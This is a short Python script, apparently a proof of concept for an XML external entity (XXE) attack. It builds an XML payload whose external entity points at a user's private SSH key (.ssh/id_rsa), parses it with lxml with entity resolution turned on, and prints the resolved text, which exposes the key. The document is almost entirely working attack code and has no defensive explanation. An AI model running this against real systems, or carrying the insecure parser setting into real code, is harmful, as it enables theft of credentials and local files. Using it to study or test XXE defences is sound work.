from lxml import etree

malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///mnt/homes/<user>/.ssh/id_rsa">
]>
<foo>&xxe;</foo>
"""
def parse_xml(xml_data):
    try:
        xml_bytes = xml_data.encode('utf-8')

        parser = etree.XMLParser(resolve_entities=True)

        root = etree.fromstring(xml_bytes, parser=parser)
        print(f"Parsed XML: {root.tag} - {root.text}")
    except etree.XMLSyntaxError as e:
        print(f"Error parsing XML: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

parse_xml(malicious_xml)